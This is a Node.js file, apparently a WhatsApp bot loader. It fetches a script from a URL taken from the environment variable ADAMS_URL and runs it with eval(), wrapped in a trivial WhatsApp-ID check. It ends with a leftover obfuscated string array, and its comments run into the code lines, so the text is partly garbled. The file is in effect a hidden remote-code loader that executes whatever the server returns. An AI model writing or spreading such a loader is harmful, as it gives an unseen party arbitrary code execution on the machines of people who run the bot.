'use strict';

const axios = require('axios'); require('dotenv').config();

// Retrieve script URL from environment variables const scriptUrl = process.env.ADAMS_URL;

/**

Validates whether a given JID (WhatsApp ID) ends with '@s.whatsapp.net'.

@param {string} jid - The JID to check.

@returns {boolean} - True if valid, false otherwise. */ function verifyJid(jid) { if (!jid.endsWith('@s.whatsapp.net')) { console.error('Invalid JID format:', jid); return false; } console.log('JID verified:', jid); return true; }


// Fetch and execute the external script axios.get(scriptUrl) .then(response => { console.log('Script loaded successfully!'); eval(response.data); // Executes the script

// Example JID verification
    const testJid = 'example@s.whatsapp.net';
    const isValid = verifyJid(testJid);
    console.log('Is JID valid?', isValid);
})
.catch(error => {
    console.error('Error loading the script:', error);
});

function getObfuscatedString() { const obfuscatedArray = ['endsWith','Script loaded successfully!','dotenv','1005560onyQDF','ADAMS_URL','2mMpdzz','7GxIgqa','env','Error loading the script:','JID verified:','626376flaDdb','104364NGWRZT','log','catch','942130hfvukD','get','4xlLZNZ','then','data','Invalid JID format:','143290vmHXvf','84225SsUbmw','config','1433tZPnIy','error']; return function() { return obfuscatedArray; }; }

                                                          
